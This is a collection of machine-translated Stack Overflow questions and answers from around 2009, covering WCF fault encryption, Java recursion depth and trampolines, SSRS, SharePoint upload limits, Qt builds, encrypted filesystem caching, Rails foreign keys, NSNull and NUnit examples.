我有一个现有的 asp.net 应用程序，它与负载平衡的 wcf 服务（iis 托管，在配置为 servicePrincipalName 的帐户下运行的应用程序池等）对话。wcf 服务返回一些自定义错误，全部使用 FaultContract(typeof(x), ProtectionLevel = ProtectionLevel.None) 定义——这些服务不向公众公开。客户端使用“服务引用”生成的类来访问服务。

这工作正常，但现在，使用最新的代码库，我们得到“必须加密主签名”。当服务返回这些故障之一时，客户端上的异常。服务代码和配置没有改变（至少是产生故障的遗留部分）。客户端服务参考生成的代码似乎变化最大（它经常被删除并重新创建）。

安全配置一年多没有变化。所有更新都是最新的。我们已经在三个环境中对此进行了测试，一旦我们部署了新的代码库，错误就会开始产生异常。似乎它必须在生成的类中，但它们是由 Visual Studio 生成的，因此非常令人困惑。

这听起来很熟悉吗？有什么建议么？

更新：删除 ProtectionLevel 属性并允许它默认会使问题“消失”，但我很好奇为什么指定 None 会导致它失败。也许它与运营合同或服务合同的默认级别冲突，但这些值在过去一年中没有改变，所以这并不能解释为什么现在有效的东西没有改变。

更新：对于它的价值，代码生成的这种变化发生在 2.0.50727.3053 和 2.0.50727.3082 之间（根据生成代码中的运行时版本注释）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-14T05:27:57.020

我自己没有遇到过这个问题，但我的问题是：你到底为什么在你的过错合同中指定“ProtectionLevel=None”？有什么特别的原因吗？

如果没有，我强烈建议您根本不要指定 - 默认值为 ProtectionLevel=EncryptAndSign，这通常是您最好的选择。试试吧，除非你有一个非常强烈和明确的理由反对它。

马克

# java - Java中的深度递归导致堆栈溢出？

> ID：860550
> 
> 赞同：53
> 
> 时间：2009-05-13T21:35:44.837
> 
> 标签：java, functional-programming, stack, overflow

在对函数式语言有一些经验之后，我开始在 Java 中更多地使用递归——但该语言似乎有一个相对较浅的调用堆栈，大约为 1000。

有没有办法使调用堆栈更大？就像在 Erlang 中那样，我可以制作数百万次调用的函数吗？

当我做 Project Euler 问题时，我越来越注意到这一点。

谢谢。

* * *

## 回答 #1

> 赞同：90
> 
> 时间：2009-05-14T03:14:04.237

增加堆栈大小只会作为临时绷带。正如其他人所指出的那样，您真正想要的是消除尾调用，而Java由于各种原因没有这个。但是，您可以根据需要作弊。

手里拿着红色药丸？好的，请这边走。

您可以通过多种方式将堆栈交换为堆。例如，与其在函数中进行递归调用，不如让它返回一个**惰性数据结构**，该数据结构在评估时进行调用。然后，您可以使用 Java 的 for-construct 展开“堆栈”。我将用一个例子来演示。考虑这个 Haskell 代码：

```
map :: (a -> b) -> [a] -> [b]
map _ [] = []
map f (x:xs) = (f x) : map f xs 
```

请注意，此函数从不评估列表的尾部。所以该函数实际上并不需要进行递归调用。在 Haskell 中，它实际上为尾部返回一个*thunk*，如果需要，它会被调用。我们可以在 Java 中做同样的事情（这使用来自[Functional Java](http://functionaljava.org)的类）：

```
public <B> Stream<B> map(final F<A, B> f, final Stream<A> as)
  {return as.isEmpty()
     ? nil()
     : cons(f.f(as.head()), new P1<Stream<A>>()
         {public Stream<A> _1()
           {return map(f, as.tail);}});} 
```

请注意，它`Stream<A>`由一个类型`A`的值和一个类型的值组成，`P1`它就像一个 thunk，它在调用 _1() 时返回流的其余部分。虽然它看起来确实像递归，但不会对 map 进行递归调用，而是成为 Stream 数据结构的一部分。

然后可以使用常规的 for-construct 展开。

```
for (Stream<B> b = bs; b.isNotEmpty(); b = b.tail()._1())
  {System.out.println(b.head());} 
```

这是另一个例子，因为你在谈论 Project Euler。这个程序使用相互递归的函数并且不会爆栈，即使是数百万次调用：

```
import fj.*; import fj.data.Natural;
import static fj.data.Enumerator.naturalEnumerator;
import static fj.data.Natural.*; import static fj.pre.Ord.naturalOrd;
import fj.data.Stream; import fj.data.vector.V2;
import static fj.data.Stream.*; import static fj.pre.Show.*;

public class Primes
  {public static Stream<Natural> primes()
    {return cons(natural(2).some(), new P1<Stream<Natural>>()
       {public Stream<Natural> _1()
         {return forever(naturalEnumerator, natural(3).some(), 2)
                 .filter(new F<Natural, Boolean>()
                   {public Boolean f(final Natural n)
                      {return primeFactors(n).length() == 1;}});}});}

   public static Stream<Natural> primeFactors(final Natural n)
     {return factor(n, natural(2).some(), primes().tail());}

   public static Stream<Natural> factor(final Natural n, final Natural p,
                                        final P1<Stream<Natural>> ps)
     {for (Stream<Natural> ns = cons(p, ps); true; ns = ns.tail()._1())
          {final Natural h = ns.head();
           final P1<Stream<Natural>> t = ns.tail();
           if (naturalOrd.isGreaterThan(h.multiply(h), n))
              return single(n);
           else {final V2<Natural> dm = n.divmod(h);
                 if (naturalOrd.eq(dm._2(), ZERO))
                    return cons(h, new P1<Stream<Natural>>()
                      {public Stream<Natural> _1()
                        {return factor(dm._1(), h, t);}});}}}

   public static void main(final String[] a)
     {streamShow(naturalShow).println(primes().takeWhile
       (naturalOrd.isLessThan(natural(Long.valueOf(a[0])).some())));}} 
```

将堆栈交换为堆可以做的另一件事是使用**多个线程**。这个想法是，不是进行递归调用，*而是创建一个进行调用的 thunk，将这个 thunk 交给一个新线程并让当前线程退出函数。*这就是 Stackless Python 之类的东西背后的想法。

以下是 Java 中的示例。`import static`抱歉，如果没有这些条款，看起来有点不透明：

```
public static <A, B> Promise<B> foldRight(final Strategy<Unit> s,
                                          final F<A, F<B, B>> f,
                                          final B b,
                                          final List<A> as)
  {return as.isEmpty()
     ? promise(s, P.p(b))
     : liftM2(f).f
         (promise(s, P.p(as.head()))).f
         (join(s, new P1<Promise<B>>>()
            {public Promise<B> _1()
              {return foldRight(s, f, b, as.tail());}}));} 
```

`Strategy<Unit> s`由线程池支持，并且该`promise`函数将 thunk 传递给线程池，返回 a `Promise`，这非常像`java.util.concurrent.Future`，只是更好。[看这里。](http://apocalisp.wordpress.com/2008/09/02/a-better-future/)关键是上面的方法*在 O(1) stack 中将右递归数据结构折叠到右侧*，这通常需要消除尾调用。因此，我们有效地实现了 TCE，以换取一些复杂性。您可以按如下方式调用此函数：

```
Strategy<Unit> s = Strategy.simpleThreadStrategy();
int x = foldRight(s, Integers.add, List.nil(), range(1, 10000)).claim();
System.out.println(x); // 49995000 
```

请注意，后一种技术非常适用于非线性递归。也就是说，即使没有尾调用的算法，它也会在常量堆栈中运行。

您可以做的另一件事是采用一种称为**蹦床**的技术。蹦床是一种计算，具体化为一种数据结构，可以单步执行。[Functional Java 库](https://github.com/functionaljava/functionaljava/blob/master/core/src/main/java/fj/control/Trampoline.java)包含我编写的一种数据[`Trampoline`](https://github.com/functionaljava/functionaljava/blob/master/core/src/main/java/fj/control/Trampoline.java)类型，它可以有效地将任何函数调用转换为尾调用。作为一个例子[，这里是一个`foldRightC`以恒定堆栈向右折叠的蹦床：](https://github.com/functionaljava/functionaljava/blob/master/core/src/main/java/fj/data/List.java#L635)

```
public final <B> Trampoline<B> foldRightC(final F2<A, B, B> f, final B b)
  {return Trampoline.suspend(new P1<Trampoline<B>>()
    {public Trampoline<B> _1()
      {return isEmpty()
         ? Trampoline.pure(b)
         : tail().foldRightC(f, b).map(f.f(head()));}});} 
```

它与使用多线程的原理相同，只是我们不是在自己的线程中调用每个步骤，而是在堆上构造每个步骤，非常类似于使用 a `Stream`，然后我们在单个循环中运行所有步骤`Trampoline.run`。

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2009-05-13T21:38:32.490

我想你可以使用这些参数

> -ss Stacksize 增加本机堆栈大小或
> 
> -oss Stacksize 增加 Java 堆栈大小，
> 
> 默认的本机堆栈大小为 128k，最小值为 1000 字节。默认的 java 堆栈大小为 400k，最小值为 1000 字节。

[http://edocs.bea.com/wls/docs61/faq/java.html#251197](http://edocs.bea.com/wls/docs61/faq/java.html#251197)

编辑：

在阅读了第一条评论（Chuck´s）以及重新阅读问题并阅读了另一个答案之后，我想澄清一下我将这个问题解释为“增加堆栈大小”。我并不打算说你可以拥有无​​限的堆栈，例如在函数式编程中（我只是触及其表面的一种编程范式）。

* * *

## 回答 #3

> 赞同：24
> 
> 时间：2009-05-13T21:38:40.417

是否使用尾递归取决于 JVM - 我不知道它们中的任何一个是否使用，但你不应该依赖它。特别是，更改堆栈大小*很少*是正确的做法，除非您对实际使用的递归级别有一些硬性限制，并且您确切知道每个级别会占用多少堆栈空间。非常脆弱。

基本上，您不应该在不是为它构建的语言中使用无限递归。恐怕您将不得不使用迭代。是的，有时这可能会有点痛苦:(

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2009-05-13T21:39:46.513

[如果你不得不问，你可能做错了什么](http://blogs.msdn.com/oldnewthing/archive/2007/03/01/1775759.aspx)。

现在，虽然您可能可以找到一种方法来增加 java 中的默认堆栈，但让我添加我的 2 美分，因为您确实需要找到另一种方法来做您想做的事情，而不是依赖增加的堆栈。

由于 java 规范没有强制要求 JVM 实现尾递归优化技术，解决这个问题的唯一方法是减少堆栈压力，或者通过减少需要保留的局部变量/参数的数量跟踪，或者理想情况下只是显着降低递归级别，或者根本不进行递归重写。

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2009-05-13T21:38:40.137

大多数函数式语言都支持尾递归。但是，大多数 Java 编译器不支持这一点。相反，它会进行另一个函数调用。这意味着您可以进行的递归调用的数量总是有一个上限（因为您最终会用完堆栈空间）。

使用尾递归，您可以重用正在递归的函数的堆栈框架，因此您对堆栈没有相同的约束。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2009-05-13T21:40:25.263

您可以在命令行上进行设置：

java -Xss8M 类

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2009-05-13T23:46:55.370

运行在 Java VM 上的 Clojure 非常想实现尾调用优化，但由于 JVM 字节码的限制（我不知道细节），它不能。因此，它只能通过一种特殊的“递归”形式来帮助自己，它实现了一些您期望从正确的尾递归中获得的基本功能。

无论如何，这意味着 JVM 目前*无法*支持尾调用优化。我强烈建议不要将递归用作 JVM 上的一般循环结构。我个人的观点是，Java 不是一种足够高级的语言。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2011-01-13T08:21:37.267

```
public static <A, B> Promise<B> foldRight(final Strategy<Unit> s,
                                          final F<A, F<B, B>> f,
                                          final B b,
                                          final List<A> as)
{
    return as.isEmpty() ? promise(s, P.p(b))
    : liftM2(f).f(promise(s, P.p(as.head())))
      .f(join(s, new F<List<A>, P1<Promise<B>>>()
        {
             public Promise<B> f(List<A> l)
             {
                 return foldRight(s, f, b, l);
             }
         }.f(as.tail())));
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-11-27T09:36:53.140

我遇到了同样的问题，最后**将递归重写为一个 for 循环**，这就成功了。

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2012-03-02T12:17:16.670

如果您正在使用 Eclipse，请将**-xss2m**设置为 vm 参数。

或者

-xss2m 直接在命令行上。

```
java -xss2m classname 
```

# reporting-services - SSAS/SSRS 从多维数据集报告中删除参数破坏报告

> ID：860557
> 
> 赞同：1
> 
> 时间：2009-05-13T21:37:41.870
> 
> 标签：reporting-services, parameters, ssas, report, cube

组，我们使用 SSAS 构建了一个数据多维数据集，现在正在使用该多维数据集构建 SSRS 报告。不确定是否有人遇到过这种情况，但是当您使用向导构建报告并包含参数时，一切看起来都很好。但是，如果您在向导完成后出现在报告中，并且您决定要删除您创建的参数之一，则它会揭穿报告，而恢复它的唯一方法是重新创建整个报告。

有什么方法可以在初始构建后删除或添加参数而不会破坏您的报告？

在此先感谢您的帮助！我喜欢这个论坛！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2011-09-05T13:59:01.593

我有同样的问题，这就是我解决它的方法：

*   转到数据报告选项卡。
*   展开 Parameter 按钮，在这里您将获得参数列表。
*   删除不需要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-31T15:30:23.520

如果您查看为每个参数创建的隐藏数据集，每个参数都有一个查询，该查询以级联方式依赖于其他一些参数。除非您删除最后一个参数，否则其他参数将不起作用。

您可以通过手动编辑参数数据集查询来解决此问题，可以更新它们以不使用您要删除的参数。

主查询还使用嵌套 FROM (... (... (...查询生成器，它允许您删除查询中对该参数的引用。

我认为如果您从向导中删除参数，它应该更新所有其他参数和查询以正常工作。这可能是最简单的路线。您的所有报表对象都应保持功能。

# asp.net - SharePoint 文件大小限制

> ID：860560
> 
> 赞同：6
> 
> 时间：2009-05-13T21:38:16.610
> 
> 标签：asp.net, sharepoint, iis, file, upload

我已经尝试了许多关于如何增加 SharePoint 文档库的上传文件大小的在线教程，但都没有成功。

关于如何增加文件上传到文档库的限制的任何想法？

我试过了：

[http://spsstuff.blogspot.com/2006/03/how-to-change-maximum-file-upload-size.html](http://spsstuff.blogspot.com/2006/03/how-to-change-maximum-file-upload-size.html) [http://www.eggheadcafe.com/software/aspnet/29380049/50mb-upload-limit --help.aspx](http://www.eggheadcafe.com/software/aspnet/29380049/50mb-upload-limit--help.aspx) [http://www.msexperts.org/blogs/mark/archive/2008/10/23/increasing-the-maximum-upload-limit-on-a-sharepoint-site.aspx](http://www.msexperts.org/blogs/mark/archive/2008/10/23/increasing-the-maximum-upload-limit-on-a-sharepoint-site.aspx)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-05-14T10:36:00.260

我遵循了您提供的第二个链接中的第一条指令：

> 1.  在 SharePoint 3.0 管理中心、应用程序管理选项卡和 Web 应用程序常规设置中，将最大上传大小配置为最大 2047 MB​​。

它工作得很好。

您确定在更改最大上传大小时选择了**适当的 Web 应用程序吗？**

![更改选定的 Web 应用程序](https://i.stack.imgur.com/bMHia.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-01-10T15:43:54.513

您还可以更改代码中的限制

```
SPWebApplication oWebApplication = SPWebApplication.Lookup(new Uri("http://MyServer:989"));

oWebApplication.MaximumFileSize = 2000;

oWebApplication.Update(); 
```

（示例取自[MSDN](http://msdn.microsoft.com/en-us/library/microsoft.sharepoint.administration.spwebapplication.aspx)）

它可能需要管理员凭据（[SPSecurity.RunWithElevatedPrivileges(delegate)](http://msdn.microsoft.com/en-us/library/microsoft.sharepoint.spsecurity.runwithelevatedprivileges.aspx)应该处理这个）。当然我宁愿使用@Marek Grzenkowicz上面提到的配置更改方法

# active-directory - Active Directory 与转换同步？

> ID：860571
> 
> 赞同：1
> 
> 时间：2009-05-13T21:40:18.370
> 
> 标签：active-directory, ldap

我对 Active Directory 不太熟悉，所以我可能在这里采取了错误的方法......

我想让我的主活动目录实例连续复制到另一个实例，并更改各种属性。例如，我可能希望更改所有用户的密码，在副本副本中设置为随机值。

数据移动只是一种方式——总是从主服务器到副本。除了修改的属性外，副本应该与主副本相同。

有什么好方法可以做到这一点？

我也想对多个主 AD 执行此操作 - 副本 AD 应包含所有主 AD 中的用户超集。

另一种方法可能是在我的主 AD 之上添加一些东西，这些 AD 可以即时执行密码/属性更改。这可能/可取吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-17T07:30:59.013

你能提供更多关于你想要完成什么的信息吗？这可能会提供一些关于如何最好地解决问题的更多见解。您是在谈论在同一林中的域之间复制信息吗？或者您是在谈论跨森林复制？

您可以查看一些[MIIS 文档](http://technet.microsoft.com/en-us/library/cc720559(WS.10).aspx)，看看它是否适合您的想法。

# c# - 如何在 Web 服务安装期间更改默认虚拟目录名称？

> ID：860573
> 
> 赞同：7
> 
> 时间：2009-05-13T21:40:35.780
> 
> 标签：c#, web-services, deployment

我有一个使用 VS2008 创建的 C# Web 服务。

我有一个部署项目，它创建了我用于部署的 MSI。

是否有设置可以更改在安装过程中提示用户的默认虚拟目录？

我宁愿不更改网络服务的名称来执行此操作。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2009-05-13T22:52:12.107

但这不是右键单击设置项目的简单案例：

选择`View`-> `File System`。

在**文件系统资源管理器**中，单击`Web Application Folder`. 按`F4`调出属性窗口（如果它不可见）。

在属性窗口中，向下滚动到`VirtualDirectory`并将其更改为您想要的任何内容。

那对你有用吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T22:13:27.550

I think I have the fix.

I couldn't find a fix thru the VS UI, so you'll need to locate your deployment project (file extention is .vdproj) and open in notepad.

Search for "VirtualDirectory"

You'll find a line similar to this:

"VirtualDirectory" = "8:OldName"

Where OldName is the current default you're seeing during installation.

Change "OldName" to whatever you want for a default. Save and build.

If there's a way to do this thru the UI, that would be even better, I couldn't find it and this works.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-07-29T22:57:14.477

Visual Studio 2015。可以在 Web 应用程序的 Web.ApplicationFolder 的属性上更改虚拟目录

# visual-studio - 为 Visual Studio 2005/2008 构建开源 Qt

> ID：860575
> 
> 赞同：6
> 
> 时间：2009-05-13T21:41:16.043
> 
> 标签：visual-studio, visual-studio-2008, qt

有没有人有关于构建 Qt 的开源版本的说明？现在存储库已打开，我正在尝试为 VS2008 构建，但在尝试构建 qmake 时出现错误。

我发现了[我正在寻找使用 Visual Studio 使用 Qt4 的开源版本编写和编译的](https://stackoverflow.com/questions/74521/im-looking-to-use-visual-studio-to-write-and-compile-using-the-open-source-versi)问题，但是这些信息已经过时，并没有真正帮助我。作为参考，这是我尝试构建时发生的情况`configure -platform win32-msvc2008`

```
Microsoft (R) Program Maintenance Utility Version 9.00.30729.01
Copyright (C) Microsoft Corporation.  All rights reserved.

        cl -c -Foproject.obj  -W3 -nologo -O2  -I. -Igenerators -Igenerators\unix -Igenerators\win32 -Igenerators\mac  -
IC:\dev\open_source\qt\include -IC:\dev\open_source\qt\include\QtCore  -IC:\dev\open_source\qt\include -IC:\dev\open_sou
rce\qt\include\QtCore  -IC:\dev\open_source\qt\src\corelib\global  -IC:\dev\open_source\qt\include\QtScript  -IC:\dev\op
en_source\qt\mkspecs\win32-msvc2008   -DQT_NO_TEXTCODEC -DQT_NO_UNICODETABLES -DQT_LITE_COMPONENT -DQT_NODLL -DQT_NO_STL
  -DQT_NO_COMPRESS -DUNICODE -DHAVE_QCONFIG_CPP -DQT_BUILD_QMAKE -DQT_NO_THREAD  -DQT_NO_QOBJECT -DQT_NO_GEOM_VARIANT -D
QT_NO_DATASTREAM -DQT_NO_PCRE -DQT_BOOTSTRAPPED   -DQMAKE_OPENSOURCE_EDITION project.cpp
project.cpp
c:\dev\open_source\qt\src\corelib\tools\qstringlist.h(45) : fatal error C1083: Cannot open include file: 'QtCore/qalgori
thms.h': No such file or directory
NMAKE : fatal error U1077: '"C:\Program Files (x86)\Microsoft Visual Studio 9.0\VC\BIN\cl.EXE"' : return code '0x2'
Stop.
Building qmake failed, return code 2 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-05-14T17:09:37.677

好吧，一件有用的事情是在 Visual Studio 命令提示符中运行配置。这应该在 Visual Studio 工具下的 Visual Studio 开始菜单组中可用。

现在，当您运行配置时，您不必指定目标平台，因为它将被 VS 命令提示符设置为环境变量。

当我没有使用 VS 命令提示符时，我从 configure 和 nmake 得到错误，并且自从切换后我没有任何问题。

所以简单的说明是：

1）打开VS命令提示符

2）导航到configure.exe所在的qt文件夹

3) 配置

4) 制作

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-09-07T17:08:28.523

请确保您已安装 ActiveState Perl

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-05-14T00:12:31.443

这篇博客[文章](http://dcsoft.com/community_server/blogs/dcsoft/archive/2009/03/06/how-to-setup-qt-4-5-visual-studio-integration.aspx)似乎有更多关于使用 Visual Studio 构建 Qt 的最新信息。希望能帮助到你。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2010-01-29T12:10:20.003

请注意，诺基亚从 Qt 4.6 开始提供他们自己的 Qt 开源 VS 构建，因此不再需要自己从源代码构建来使用 Visual Studio 进行开发。访问他们的开源[下载页面](http://download.qt.nokia.com/qt/source/)，并查找名为（例如）qt-win-opensource-4.6.1-vs2008.exe 的构建。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-11-13T15:14:35.213

此外，如果您只是想使用 MSVC 进行编译，以便可以使用 Visual Studio 使用开源库进行开发，我整理了一个项目来提供带有 MSVC 2008 的“预构建”Qt LGPL 库。

它可能会有所帮助，并且具有占用更少空间然后自己编译的优点。它还提供了一个命令提示符，其中包含为您设置的所有环境变量，以及一个使用 Qt 环境启动 Visual Studio 的链接。它被称为[qt-msvc-installer](http://code.google.com/p/qt-msvc-installer/)。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-02-17T05:07:50.377

user156973 说了什么。安装 ActiveState perl 并再次运行 configure。

# linux - 加密文件系统和 Linux 缓冲区缓存

> ID：860576
> 
> 赞同：1
> 
> 时间：2009-05-13T21:41:20.863
> 
> 标签：linux, filesystems

我目前使用以 Java 服务器为前端的 Berkeley DB 来实现高性能的磁盘支持缓存。如果您在允许它面对实时流量之前对其进行预热，您的更新率很低，并且您的工作集适合内存，Linux 缓冲区缓存会做得很好。它比 memcache 快得多，部分原因是您不需要上下文切换到 memcached 并重新读取。我们对表演感到非常满意。

我们将向缓存中添加一些我们不愿意以纯文本形式留在磁盘上的数据。我们已经测量并且对请求处理期间的解密性能感到不满意，因此我们正在寻找仅在从磁盘加载数据然后将其保存在内存中时才解密的解决方案。

在构建这样的东西之前，我想知道我们是否可以简单地滑入加密的文件系统并继续依赖操作系统为我们管理缓存。我还没有找到任何文档告诉我解密是在哪一层完成的。

所以我的问题是：谁能告诉我，对于任何特定的 Linux 加密 FS，（en|de）加密是在缓冲区缓存之下（因此缓存包含明文）还是之上（并且缓存包含密文）完成？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-16T03:34:23.250

缓冲区缓存位于实际文件系统下方，因此它将缓存加密数据。[请参阅IBM 的文件系统剖析中](http://www.ibm.com/developerworks/linux/library/l-linux-filesystem/)的图表。由于您要缓存未加密的数据，只要您的加密文件系统是使用“循环”设备创建的，缓冲区缓存也将包含您的数据的未加密副本，因此它应该很快（以 FS 的更多内存为代价缓冲区在使用中）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T22:02:38.707

我没有玩过这个，但我很确定缓冲区缓存和虚拟机不知道加密，所以你应该看到与你的使用相当的性能。

# .net - 将 Web 应用程序移植到桌面应用程序

> ID：860593
> 
> 赞同：0
> 
> 时间：2009-05-13T21:47:36.050
> 
> 标签：.net, winforms, web-applications, cassini

我有一个用于典型数据输入、检索和报告类型功能的生产网络应用程序。出于移动性的原因（*需要现场访问*），我的任务是将该 Web 应用程序移植到桌面应用程序。因此，我没有设计或编码的现有应用程序的结构是：

* * *

**3 个**单独的项目，每个项目都有自己的**DAL**和**SQL DB**，名称相同。 *项目 1*是核心应用程序。 *项目 2存在于**项目 1*之上并添加了更多功能，但不能单独存在。 *项目 3*建立在前 2 个项目的基础上，与两个项目一样大，但又不能单独存在。

要进入Web 应用程序*Project 3*，请登录*1*，**选择**人员，**导航**至*2*，**选择****注册**，导航至*3*以使用**计划**。所有三个项目共享*项目 1*中现有的**1 个 BLL**。

 ** * *

考虑到所有这一切，时间紧迫，我相对较新，以及我与最初三个人的创作（3 个单独的开发者创建了上述 3 个项目）中的任何一个都没有关系的事实，对我有什么建议。

例如，我可以重用 aspx 页面吗？它们可以像 WPF 一样嵌入吗？转换？

我应该记住哪些类型的 UI 重构注意事项？从理论上讲，是否存在某些会破坏事物的变化？

其他任何人都必须做类似的事情吗？尖端？

谢谢！

## 编辑 1

下面有一个关于卡西尼的建议，巧合的是，这里有一篇关于它的帖子。 [这里](https://stackoverflow.com/questions/103785/what-are-the-disadvantages-of-using-cassini-instead-of-iis) 那篇文章让我相信它对我不起作用，因为我的“应用程序”实际上是 3 个项目，有 3 个单独的部署。正确还是我读错了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T21:55:18.500

时间紧迫？

如何在本地安装 Cassini Web 服务器或同等服务器，然后让 Web 应用程序在本地机器上运行？尽管您会遇到数据库同步问题，但这将消除大部分转换。在漫游桌面上创建的任何新记录也将与共享操作存储同步。

除此之外，我不知道重用 ASPX 页面的好方法。当然，如果将业务逻辑分解到单独的类中，而不是嵌入到页面本身中，您将能够重用 BL 类。

# c# - NUnit 示例代码？

> ID：860594
> 
> 赞同：7
> 
> 时间：2009-05-13T21:48:10.760
> 
> 标签：c#, unit-testing, nunit

我想学习如何使用 NUnit。我通过阅读然后玩真正的代码来学得最好。我在哪里可以找到一个以示例方式使用 NUnit 的小型简单 C# 项目？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T21:49:56.763

[NUnit 的开发者 wiki](http://nunit.com/devwiki.cgi?NunitExamplePage)上有很多很好的例子。

**更新为原始链接已损坏**：

可以在[NUnit 文档页面](http://www.nunit.org/index.php?p=docHome&r=2.5.10)上找到基本示例。查看 Getting Started/QuickStart 小节和 Assertions/* 小节。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-13T21:51:33.920

来自我自己的项目（现实生活，所以不仅仅是演示，一切都会很简单:)

*   [杂项工具](http://pobox.com/~skeet/csharp/miscutil)
*   [更多LINQ](http://code.google.com/p/morelinq/)

两者都相当小，虽然 MiscUtil 是两者中较大的一个，但它主要是非常小的单个组件的集合。

MoreLINQ 经过大量测试；MiscUtil 的覆盖范围更广，因为我在进行单元测试之前就开始使用它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T21:49:45.670

您应该在下载 NUnit 时找到 NUnit 示例；这些是如何使用 NUnit 的非常好的示例。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T21:59:07.963

我不认为阅读单元测试比看到有人编写它们并解释他们为什么这样做更有帮助。尝试一些截屏视频。例如 DimeCast.Net....

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-06-23T11:06:36.147

这应该很有用...

```
using System.Text;
using NUnit.Framework;

namespace Test.SampleTests
{
    [TestFixture]
    public class CustomerTestClass
    {
        [TestCase(1, true)] // valid customer
        [TestCase(2, true)] // valid customer
        [TestCase(1123123123132, false)] // invlaid customer
        public void IsValidCustomerTest(int customerId, bool isValid)
        {
            Assert.AreEqual(_service.ValidateCust(customerId), isValid);
        }
    }
} 
```

取自这里 - [https://coderwall.com/p/vwvura](https://coderwall.com/p/vwvura)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-14T03:14:31.007

我建议在 dnrTV 上观看有关 TDD 的视频。请参阅[第 1](http://www.dnrtv.com/default.aspx?showNum=10)部分和[第 2 部分](http://www.dnrtv.com/default.aspx?showNum=11)。

# ruby-on-rails - 对于 ActiveRecord 一对多关联，我应该设置哪个 :foreign_key 选项？

> ID：860595
> 
> 赞同：1
> 
> 时间：2009-05-13T21:48:22.787
> 
> 标签：ruby-on-rails, ruby, activerecord

ActiveRecord`has_many`和`belongs_to`方法都可以`:foreign_key`选择。如果我需要使用它来处理非标准的 FK 列名，我应该为父模型 ( `has_many`) 、子模型 ( `belongs_to`) 或两者都设置它，还是有关系？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T22:15:05.443

您应该`:foreign_key`在两者上都设置选项。

考虑以下两个模型：

```
class Article < ActiveRecord::Base
  has_many :comments, :foreign_key => "articleID"
end

class Comment < ActiveRecord::Base
  belongs_to :article, :foreign_key => "articleID"
end 
```

`has_many`在类中声明`Article`允许您执行以下操作：

```
Article.find(12).comments  # Finds all comments with comment.articleID == 12 
```

模型中的`belongs_to`方法调用`Comment`允许：

```
Comment.last.article       # Finds article with article.id == comment.articleID 
```

如您所见，在这两种情况下都使用了外键。如果在任一位置省略，则该特定关联代理将无法正常工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T22:17:41.850

`belongs_to`猜测外键为关联名加`_id`。

`has_one`猜测外键是包含类的名称 plus `_id`。

通常对于非标准密钥，您只需要在一个地方使用它。

```
class Book < ActiveRecord::Base
  # Rails default fk is isbn_id
  belongs_to :isbn, :class_name => "BarCode", :foreign_key => "bar_code_id" 
end

class BarCode < ActiveRecord::Base
  # Rails default fk is bar_code_id, so you don't need to specify it
  has_one :book
end 
```

# iphone - 这个 (NSNull*)controller == [NSNull null] 应该做什么？为什么不只是控制器 == nil？

> ID：860599
> 
> 赞同：11
> 
> 时间：2009-05-13T21:48:55.580
> 
> 标签：iphone, cocoa-touch, uikit

在一个 Apple 示例中，我看到了这个：

```
myController *controller = [viewControllers objectAtIndex:page];
if ((NSNull *)controller == [NSNull null]) {
    controller = [[myController alloc] initWithPageNumber:page];
    [viewControllers replaceObjectAtIndex:page withObject:controller];
    [controller release];
} 
```

我对这条线很感兴趣：

```
if ((NSNull *)controller == [NSNull null]) { 
```

如果我会这样做，我会检查零。为什么他们做的那么复杂？那实际上在做什么？对我来说，看起来他们将控制器对象转换为 NSNull，然后检查它是否与 NSNull 中的 null 相同。

AFAIK nil 表示“无对象”，null 表示“无”。请帮我在这里拍一张清晰的照片！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-05-13T21:53:52.653

大多数容器不允许在其中插入“nil”对象。如果你真的想在你的容器中插入一个空值，可以使用 NSNull 实例（NSNull 是一个单例）。

在您的特定示例中，控制器是从数组中获取的。然后确保该对象不是 NSNull 实例是一种很好的做法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-07-03T05:16:01.660

集合类喜欢`NSArray`并且`NSDictionary`不能包含`nil`值。您的 ivar`viewController`是集合类的一个实例。`NSNULL`是专门作为 的占位符创建的`nil`，您可以将其放入集合类中。

该类定义了一个单例对象，这意味着（您使用创建`NSNull`的）只有一个实例，但它可以在任意多的地方使用。`NSNull``[NSNull null]`

# django - Django 模型可以从管理界面自动填写当前经过身份验证的用户吗？

> ID：860600
> 
> 赞同：4
> 
> 时间：2009-05-13T21:49:13.300
> 
> 标签：django, django-models, django-admin

在从管理界面使用 Notes 时，我希望能够在 Note 中包含对当前经过身份验证的用户的引用。该模型看起来像：

```
from django.db import models
from django.contrib.auth.models import User
